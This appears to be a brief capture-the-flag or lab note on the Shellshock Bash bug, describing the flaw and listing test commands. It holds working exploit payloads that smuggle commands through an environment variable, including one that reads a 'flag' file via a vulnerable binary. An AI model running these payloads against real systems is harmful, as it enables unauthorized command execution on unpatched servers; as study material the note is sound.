Shellsock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell.
Shellshock could enable an attacker to cause Bash to execute arbitrary
commands and gain unauthorized access to many Internet-facing services, such as web servers, that use
Bash to process requests.


test with bash server
1) env x='() { :;}; echo vulnerable' /bin/bash -c "echo this is a test"	# bash in bin/bash
-> fair enough
2) env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"	# bash in directory
-> 
3) env x='() { :;}; /bin/cat flag' ./bash -c "echo this is a test"
-> /bin/cat: flag: Permission denied
4) env x='() { :;}; /bin/cat flag' ./shellshock
